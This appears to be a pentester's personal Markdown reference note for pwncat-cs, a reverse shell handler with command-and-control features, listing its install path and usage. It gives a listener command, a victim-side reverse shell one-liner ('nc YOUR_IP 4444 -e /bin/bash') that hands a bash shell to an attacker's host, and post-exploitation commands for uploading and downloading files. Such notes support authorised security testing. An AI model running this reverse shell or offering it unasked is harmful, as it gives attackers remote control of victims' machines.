---
tags: [tool, c2]
tool: pwncat-cs
category: C2
installed: true
---

# pwncat-cs - Reverse Shell Handler

## Overview
Enhanced netcat with C2 features

## Location
/home/kali/.local/bin/pwncat-cs

## Usage

### Listener
pwncat-cs -lp 4444

### Victim connects
nc YOUR_IP 4444 -e /bin/bash

### Commands (Ctrl+D for local mode)
help
upload file
download file
install python3
shell
